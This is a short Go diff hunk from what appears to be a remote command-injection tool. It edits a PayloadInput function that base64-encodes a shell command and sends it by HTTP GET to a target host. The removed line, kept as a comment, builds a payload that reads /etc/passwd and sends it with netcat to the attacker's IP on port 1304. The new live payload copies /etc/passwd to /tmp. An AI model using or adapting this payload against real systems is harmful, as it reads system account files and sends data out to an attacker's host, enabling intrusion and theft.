@@ -28,7 +28,8 @@ func PayloadInput() {
 		// if scanner.Scan() {
 		// 	payloadcmd = scanner.Text()
 		// }
-		payloadcmd = "cat /etc/passwd > /tmp/passwd.txt && nc " + sourceip.String() + " 1304 < /tmp/passwd.txt"
+		// payloadcmd = "cat /etc/passwd > /tmp/passwd.txt && nc " + sourceip.String() + " 1304 < /tmp/passwd.txt"
+		payloadcmd = "cat /etc/passwd > /tmp/passwd.txt"
 		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
 		targeturl := "http://" + targetip + ":" + targetport
 		req, err := http.NewRequest(("GET"), targeturl, nil)
